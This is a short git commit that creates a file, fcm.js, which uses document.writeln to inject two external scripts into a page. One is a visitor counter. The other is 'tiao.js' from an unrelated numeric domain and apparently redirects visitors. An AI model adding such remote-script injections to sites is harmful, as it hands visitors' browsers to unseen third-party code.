cc2df5035d137455d6cfc519d5b21c8e4582a7d9
js999999999 <js-9@outlook.com>
2015-09-01 16:17:30 +0800

    Create fcm.js

---
+++ cy5z/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count47.51yes.com\/click.aspx?id=476013148&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/cy5z/tiao.js ><\/script>");
